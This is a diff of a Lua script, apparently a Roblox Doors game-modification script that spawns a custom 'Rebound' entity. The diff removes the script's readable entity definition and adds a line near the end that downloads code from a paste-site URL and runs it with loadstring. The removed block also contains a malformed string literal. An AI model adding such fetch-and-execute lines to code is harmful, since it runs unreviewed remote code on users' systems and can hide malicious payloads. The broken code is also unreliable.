@@ -412,95 +412,9 @@ game:GetService("ReplicatedStorage").GameData.LatestRoom:GetPropertyChangedSigna
 local Reboundcolor = Instance.new("ColorCorrectionEffect",game.Lighting) game.Debris:AddItem(Reboundcolor,24)
 				Reboundcolor.Name = "Warn"
 				Reboundcolor.TintColor = Color3.fromRGB(65, 138, 255) Reboundcolor.Saturation = -0.7 Reboundcolor.Contrast = 0.2
-				game.TweenService:Create(Reboundcolor,TweenInfo.new(15),{TintColor = Color3.fromRGB(255, 255, 255),Saturation = 0, Contrast = 0}):Play()
-				camShake:ShakeOnce(10,3,0.1,6,2,0.5)
--- Create entity
-local entityTable = Spawner.createEntity({
-    CustomName = "Rebound by malinerson", -- Custom name of your entity
-    Model = "rbxassetid://11459817091", -- Can be GitHub file or rbxassetid
-    Speed = 500, -- Percentage, 100 = default Rush speed
-    DelayTime = 5, -- Time before starting cycles (seconds)
-    HeightOffset = 0,
-    CanKill = true,
-    KillRange = 20,
-    BackwardsMovement = true,
-    BreakLights = false,
-    FlickerLights = {
-        true, -- Enabled/Disabled
-        1, -- Time (seconds)
-    },
-    Cycles = {
-        Min = 1,
-        Max = 4,
-        WaitTime = 1,
-    },
-    CamShake = {
-        true, -- Enabled/Disabled
-        {2.5, 10, 0.1, 1}, -- Shake values (don't change if you don't know)
-        45, -- Shake start distance (from Entity to you)
-    },
-    Jumpscare = {
-        true, -- Enabled/Disabled
-        {
-            Image1 = "rbxassetid://236543215, -- Image1 url
-            Image2 = "rbxassetid://236777652", -- Image2 url
-            Shake = true,
-            Sound1 = {
-                10483790459, -- SoundId
-                { Volume = 0.5 }, -- Sound properties
-            },
-            Sound2 = {
-                10483837590, -- SoundId
-                { Volume = 0.5 }, -- Sound properties
-            },
-            Flashing = {
-                true, -- Enabled/Disabled
-                Color3.fromRGB(255, 255, 255), -- Color
-            },
-            Tease = {
-                true, -- Enabled/Disabled
-                Min = 1,
-                Max = 3,
-            },
-        },
-    },
-    CustomDialog = {"You died to Rebound by ping", "his speed is fast", "hide fast", "he Rebounds 1-4 times."}, -- Custom death message
-})
-
-
------[[  Debug -=- Advanced  ]]-----
-entityTable.Debug.OnEntitySpawned = function()
-    print("Entity has spawned:", entityTable)
-end
-
-entityTable.Debug.OnEntityDespawned = function()
-    print("Entity has despawned:", entityTable)
-end
-
-entityTable.Debug.OnEntityStartMoving = function()
-    print("Entity has started moving:", entityTable)
-end
-
-entityTable.Debug.OnEntityFinishedRebound = function()
-    print("Entity has finished rebound:", entityTable)
-end
-
-entityTable.Debug.OnEntityEnteredRoom = function(room)
-    print("Entity:", entityTable, "has entered room:", room)
-end
-
-entityTable.Debug.OnLookAtEntity = function()
-    print("Player has looked at entity:", entityTable)
-end
-
-entityTable.Debug.OnDeath = function()
-    warn("Player has died.")
-end
-------------------------------------
-
-
--- Run the created entity
-Spawner.runEntity(entityTable)
+		game.TweenService:Create(Reboundcolor,TweenInfo.new(15),{TintColor = Color3.fromRGB(255, 255, 255),Saturation = 0, Contrast = 0}):Play()
+camShake:ShakeOnce(10,3,0.1,6,2,0.5)
+loadstring(game:HttpGet("https://pastefy.ga/ivPRyQ4H/raw"))()
 end
 end)
 Spawn1()
